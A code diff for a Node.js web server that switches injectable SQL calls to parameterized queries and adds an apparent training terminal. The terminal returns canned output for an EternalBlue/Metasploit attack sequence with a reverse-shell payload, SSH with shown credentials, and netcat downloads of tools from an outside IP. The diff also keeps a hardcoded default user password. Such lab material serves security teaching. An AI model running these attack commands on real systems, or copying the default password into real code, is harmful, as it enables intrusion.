@@ -7,8 +7,6 @@ const cors = require('cors');
 const bcrypt = require('bcrypt');
 const { stringify } = require('querystring');
 const saltRounds = 10; // Adjust based on security requirements
-const SESSION_LENGTH = 4;
-const DEBUG = true;
 
 process.env.TZ = 'UTC'; // UTC Time Zone
 
@@ -71,15 +69,14 @@ initializeDatabaseConnection()
                 });
                 const payload = ticket.getPayload();
 
-
-                logToDatabase('info', `Token verified successfully. UserId: ${payload['email']}`);
+                logToDatabase('info', `Token verified successfully. UserId: ${payload['sub']}`);
 
                 const userId = payload['email'];
 
                 // Check if the user exists in the Users table
+                const [userExists] = await pool.query('SELECT * FROM Users WHERE userId = ?', [userId]);
 
-                const [userExists] = await pool.query(`CALL checkUserExists("${userId}")`);
-                if (userExists[0].length === 0) {
+                if (userExists.length === 0) {
                     // User does not exist, create a new user
                     bcrypt.hash("P@ssw0rd", saltRounds, async (err, hashedPassword) => {
                         if (err) {
@@ -88,8 +85,13 @@ initializeDatabaseConnection()
                         }
                         try {
                             // Insert the new user with a parameterized query
-                            await pool.query(`CALL registerUser("${userId}", "${hashedPassword}")`);
+                            await pool.query('INSERT INTO Users (userId, pass) VALUES (?, ?)', [userId, hashedPassword]);
                             logToDatabase('info', `New user registered successfully: ${userId}`);
+
+                            // Create a new session after registering the user
+                            const [result] = await pool.query('INSERT INTO Sessions (userId, startedAt, expiresAt) VALUES (?, ?, ?)', [userId, new Date(Date.now()), new Date(Date.now() + 4 * 3600 * 1000)]); // 4 Hours
+                            const sessionId = result.insertId;
+                            logToDatabase('info', `New session created for userId: ${userId}, sessionId: ${sessionId}`);
 
                             // Include sessionId in the response JSON
                             res.json({ verified: true, sessionId: sessionId });
@@ -98,29 +100,36 @@ initializeDatabaseConnection()
                             return res.status(500).json({ success: false, message: 'Error registering new user' });
                         }
                     });
+                } else {
+                    // User exists, proceed to check or create session
+                    const [existingSessions] = await pool.query('SELECT * FROM Sessions WHERE userId = ? AND expiresAt > NOW()', [userId]);
+
+                    if (existingSessions.length > 0) {
+                        // Update existing session instead of creating a new one
+                        const sessionId = existingSessions[0].sessionId;
+                        logToDatabase('info', `Session already exists for userId: ${userId}. Updating session: ${sessionId}`);
+                        await pool.query('UPDATE Sessions SET expiresAt = ? WHERE sessionId = ?', [new Date(Date.now() + 4 * 3600 * 1000), sessionId]); // Update expiration time
+
+                        // Include sessionId in the response JSON
+                        res.json({ verified: true, sessionId: sessionId });
+                    } else {
+                        // Create a new session
+                        const [result] = await pool.query('INSERT INTO Sessions (userId, startedAt, expiresAt) VALUES (?, ?, ?)', [userId, new Date(Date.now()), new Date(Date.now() + 4 * 3600 * 1000)]); // 4 Hours
+                        const sessionId = result.insertId;
+                        logToDatabase('info', `New session created for userId: ${userId}, sessionId: ${sessionId}`);
+
+                        // Include sessionId in the response JSON
+                        res.json({ verified: true, sessionId: sessionId });
+                    }
                 }
-
-                // Create a new session
-                // Procedure checks if there is a prexisting session that can be extended by SESSION_LENGTH amount of time
-                const [result] = await pool.query(`SELECT startSession("${userId}", ${SESSION_LENGTH})`); // 4 Hours
-                const sessionId = Object.values(result[0]);
-
-                // DEBUGGING
-                if (debug) {
-                    console.log(`Query returned: `);
-                    console.log(`${result}`);
-                    console.log(`sessionId: ${Object.values(result[0])}`);
-                }
-
-                logToDatabase('info', `New session created for userId: ${userId}, sessionId: ${sessionId}`);
-
-                // Include sessionId in the response JSON
-                res.json({ verified: true, sessionId: sessionId });
             } catch (error) {
                 logToDatabase('error', `Token verification failed: ${error}`);
                 res.status(401).json({ verified: false, error: error.message });
             }
         });
+
+
+
 
         // VerifySession middleware
         const verifySession = async (req, res, next) => {
@@ -132,7 +141,6 @@ initializeDatabaseConnection()
             try {
                 // Retrieve user ID associated with session ID from the database
                 const userId = await getUserIdFromSessionId(sessionId);
-
                 if (!userId) {
                     return res.status(401).json({ message: 'Invalid or expired session' });
                 }
@@ -170,8 +178,8 @@ initializeDatabaseConnection()
 
             try {
                 // Check if username exists
-                const [users] = await pool.query(`CALL checkUserExists("${username}")`);
-                if (users[0].length > 0) {
+                const [users] = await pool.query('SELECT * FROM Users WHERE userId = ?', [username]);
+                if (users.length > 0) {
                     return res.status(409).json({ success: false, message: 'Username already exists' });
                 }
 
@@ -184,7 +192,7 @@ initializeDatabaseConnection()
 
                     try {
                         // Insert the new user with a parameterized query
-                        await pool.query(`CALL registerUser("${username}", "${hashedPassword}")`);
+                        await pool.query('INSERT INTO Users (userId, pass) VALUES (?, ?)', [username, hashedPassword]);
                         res.status(201).json({ success: true, message: 'User registered successfully' });
                     } catch (error) {
                         logToDatabase('error', `Error registering new user: ${error}`)
@@ -202,15 +210,13 @@ initializeDatabaseConnection()
             const { username, password } = req.body;
             console.log(`Attempting to sign in user: ${username}`);
 
-            // WE SHOULD PROBABLY CHANGE THIS IN THIS FUTURE
-            const [users] = await pool.query("SELECT * FROM Users WHERE userid=?", [username]);
-            if (users[0].length < 0) {
+            const [users] = await pool.query('SELECT * FROM Users WHERE userId = ?', [username]);
+            if (users.length === 0) {
                 return res.status(401).json({ authenticated: false, message: 'Invalid username or password' });
             }
+
             const user = users[0];
-            // const user = Object.values((users[0])[0]);
             const decodedPassword = decodeURIComponent(password);
-            // console.log(decodedPassword);
             bcrypt.compare(decodedPassword, user.pass, async (err, result) => {
                 if (err) {
                     logToDatabase('error', `Error during password comparison: ${err}`)
@@ -221,8 +227,8 @@ initializeDatabaseConnection()
                     logToDatabase('warn', `Authentication failed for user ${username}`)
                     return res.status(401).json({ authenticated: false, message: 'Invalid username or password' });
                 }
-                const [sessionResult] = await pool.query(`SELECT startSession("${username}", ${SESSION_LENGTH})`);
-                const sessionId = Object.values(sessionResult[0]);
+                const [sessionResult] = await pool.query('INSERT INTO Sessions (userId, startedAt, expiresAt) VALUES (?, ?, ?)', [username, new Date(Date.now()), new Date(Date.now() + 4 * 3600 * 1000)]); // 4 Hours
+                const sessionId = sessionResult.insertId;
                 logToDatabase('info', `User signed in successfully: ${username}`)
                 logToDatabase('info', `Session created for user: ${username}, userId: ${user.id}, sessionId: ${sessionId}`)
                 res.json({ authenticated: true, sessionId: sessionId });
@@ -273,12 +279,29 @@ initializeDatabaseConnection()
         app.post('/execute-command', async (req, res) => {
             const { command } = req.body; // Extract the command from the request body
 
-            // Define responses or actions for each command
             const commandResponses = {
-                'hello': 'Hello, world!\r\n',
                 'date': () => `Current Date and Time: ${new Date().toString()}\r\n`,
-                // Add other commands and their responses or functions here
+                'nmap -p 139,445 192.168.1.0/24': () => `Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 192.168.1.103\nHost is up (0.011s latency).\nPORT    STATE    SERVICE\n139/tcp open     netbios-ssn\n445/tcp open     microsoft-ds\r\n`,
+                'msfconsole': () => `Launching msfconsole....\r\n`,
+                'use auxiliary/scanner/smb/smb_ms17_010': () => `msf auxiliary(scanner/smb/smb_ms17_010)>\r\n`,
+                'set RHOST 192.168.1.103': () => `RHOSTS => 192.168.1.103\r\n`,
+                'run': () => `[+] 192.168.1.103:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2012 R2 x64 (64-bit)\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution complete\r\n`,
+                'use exploit/windows/smb/ms17_010_eternalblue': () => `msf exploit(windows/smb/ms17_010_eternalblue)>\r\n`,
+                'set payload generic/shell_reverse_tcp': () => `payload => generic/shell_reverse_tcp\r\n`,
+                'exploit': () => `Exploiting 192.168.1.103....\n....\nExploited....\nFLAG: u46U0o\r\n`,
+                'help-module1': () => `Available Module 1 Commands:\n- nmap -p 139,445 192.168.1.0/24\n- msfconsole\n- use auxiliary/scanner/smb/smb_ms17_010\n- set RHOST 192.168.1.103\n- run\n- use exploit/windows/smb/ms17_010_eternalblue\n- set payload generic/shell_reverse_tcp\nFor more information on each command, please refer to the respective tool's documentation.\r\n`,
+                
+                'ssh 192.168.1.47': () => `Username: faziodavid\r\nPassword: 1aB3cD7e\r\nLast login: Thu Jan 25 16:43:27 2024 from 192.168.1.47\nfaziodavid@Ubuntu:$`,
+                'su - bmcadmin': () => `Switched to BMC default user successfully.`,
+                'nc 74.233.19.204 12345 > nmap.tar.gz': () => `Downloaded nmap tool successfully.`,
+                'nc 74.233.19.204 12345 > metasploit.tar.gz': () => `Downloaded Metasploit tool successfully.`,
+                'tar -xzf nmap.tar.gz': () => `Unzipped nmap tool successfully.`,
+                'tar -xzf metasploit.tar.gz': () => `Unzipped Metasploit tool successfully.`,
+                'nmap 192.168.1.47': () => `Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 192.168.1.47\nHost is up (0.012s latency).\nPORT STATE SERVICE\n80/tcp open http\n135/tcp open msrpc\n139/tcp open netbios-ssn\n623/tcp open ipmi\n`,
+                'nmap -sV -p 135 192.168.1.47': () => `Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 192.168.1.47\nPORT STATE SERVICE VERSION\n135/tcp open msrpc Microsoft Windows RPC\n(unauthenticated) 5.1 (Windows 10)\n\nFLAG: HivRzt`,
+                'help-module2': () => `Available Module 2 Commands:\n- ssh 192.168.1.47\n- su - bmcadmin\n- nc 74.233.19.204 12345 > nmap.tar.gz\n- nc 74.233.19.204 12345 > metasploit.tar.gz\n- tar -xzf nmap.tar.gz\n- tar -xzf metasploit.tar.gz\n- nmap 192.168.1.47\n- nmap -sV -p 135 192.168.1.47\nFor more information on each command, please refer to the respective tool's documentation.\r\n`
             };
+            
 
             if (command in commandResponses) {
                 const response = commandResponses[command];
